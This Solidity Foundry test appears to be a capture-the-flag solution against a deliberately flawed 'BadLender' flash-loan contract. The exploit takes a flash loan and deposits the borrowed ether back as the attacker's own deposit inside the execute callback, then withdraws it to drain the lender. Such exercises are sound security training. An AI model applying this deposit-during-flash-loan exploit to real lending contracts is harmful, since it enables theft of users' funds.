// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {BadLenderBaseTest} from "./BadLenderBase.t.sol";

contract BadLenderTest is BadLenderBaseTest {
    function testExploit() external validation {
        vm.startPrank(address(this));
        lender.flashLoan(100 ether);
        lender.withdraw(100 ether);
        vm.stopPrank();
    }
    
    fallback() external payable{
    }
    
    function execute() external payable{
        vm.startPrank(address(this));
        console2.log("addr.balance: ", address(this).balance);
        lender.deposit{value: address(this).balance}();
        vm.stopPrank();
    }
}
